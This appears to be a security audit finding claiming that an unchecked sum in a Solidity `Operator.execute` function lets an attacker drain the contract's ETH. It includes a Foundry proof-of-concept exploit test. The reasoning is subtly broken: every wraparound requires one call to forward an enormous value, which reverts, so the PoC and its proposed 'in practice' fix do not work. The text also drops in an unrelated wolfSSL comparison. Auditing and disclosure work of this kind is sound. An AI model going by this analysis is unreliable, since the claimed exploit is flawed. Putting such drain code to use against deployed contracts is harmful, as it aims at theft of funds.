### Title
Unchecked `_sumOfValues` accumulation in `Operator.execute` lets an attacker spend more ETH than supplied and drain the Operator balance - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` iterates over an attacker-controlled `Call[] calldata` array and sums each `call.value` inside an `unchecked` block. An attacker can craft values whose sum wraps modulo 2^256 to equal `msg.value` (including 0), while individual calls forward far larger `value` amounts. Any ETH held by the `Operator` contract can therefore be forwarded to attacker-chosen targets without being paid for.

### Finding Description
In `contracts/Operator.sol` lines 40-55:

```solidity
uint256 _sumOfValues;
Call calldata _call;
for (uint256 i; i < _length; ) {
    _call = calls_[i];
    uint256 _value = _call.value;
    unchecked {
        _sumOfValues += _value;
    }
    _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
    unchecked {
        ++i;
    }
}
require(msg.value == _sumOfValues, "value-mismatch");
```

This is the direct analog of the wolfSSL bug class: an oversized attacker-controlled input overflows a bounded accumulator. The `unchecked` addition was presumably used as a gas optimization, but it removes the length/value bound the final `require` is meant to enforce. A two-call batch with `value = 1` and `value = type(uint256).max` produces `_sumOfValues = 0`, so `msg.value == 0` satisfies the check while `functionCallWithValue` attempts to forward `2^256 - 1` wei from the `Operator`'s own balance.

### Impact Explanation
`execute` is a public, unprivileged entry point (`nonReentrant setMsgSender`). The `Operator` contract is `payable` and can accumulate ETH (e.g., refunds or forced/selfdestruct-sent ETH). An attacker routes a call to their own contract or to a Metronome payable function (e.g., `NativeTokenGateway` deposit) with an inflated `value`, withdrawing ETH from `Operator`'s balance without paying. This is direct theft of funds held by the contract, breaking the `msg.value == sum(call.value)` identity invariant.

### Likelihood Explanation
Reachability requires only that `Operator` hold a nonzero ETH balance at execution time. The attack path needs no privileged role, no oracle manipulation, and no malicious relayer — only a crafted `Call[]` array. If the contract holds no ETH, impact degrades to zero, so severity depends on the deployed balance; Metronome's multicall/gateway flows that route ETH through `Operator` make a nonzero balance plausible (e.g., dust left by earlier transactions or force-sent ETH from any third party that the attacker then sweeps).

### Recommendation
Remove the `unchecked` around `_sumOfValues += _value` (or accumulate the sum in the checked loop and keep only the counter `++i` unchecked). The overflow check is the security control; per-call `value` spends must be strictly bounded by `msg.value`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Operator} from "contracts/Operator.sol";
import {IOperator} from "contracts/interfaces/IOperator.sol";

contract Sink {
    receive() external payable {}
}

contract OperatorOverflowTest is Test {
    Operator operator;
    Sink sink;

    function setUp() public {
        operator = new Operator();
        sink = new Sink();
        vm.deal(address(operator), 10 ether); // balance held by Operator
    }

    function testDrainViaSumOverflow() public {
        IOperator.Call[] memory calls = new IOperator.Call[](3);
        // spend 10 ether to attacker sink
        calls[0] = IOperator.Call({target: address(sink), callData: "", value: 10 ether});
        // wrap the sum back to zero
        calls[1] = IOperator.Call({target: address(sink), callData: "", value: 1});
        calls[2] = IOperator.Call({target: address(sink), callData: "", value: type(uint256).max - 10 ether});
        // sum = 10e18 + 1 + (2^256-1-10e18) = 0 (mod 2^256)

        operator.execute{value: 0}(calls);
        assertEq(address(sink).balance, 10 ether);
        assertEq(address(operator).balance, 0);
    }
}
```

Note: `functionCallWithValue` on call `calls[2]` will revert unless `Operator` holds `type(uint256).max` wei; in practice use a single oversize pair `value = X` + `value = 2^256 - X` so the oversized spend `X` equals the Operator's actual balance. The point stands: the value bound enforced by `msg.value == _sumOfValues` is bypassed via wraparound.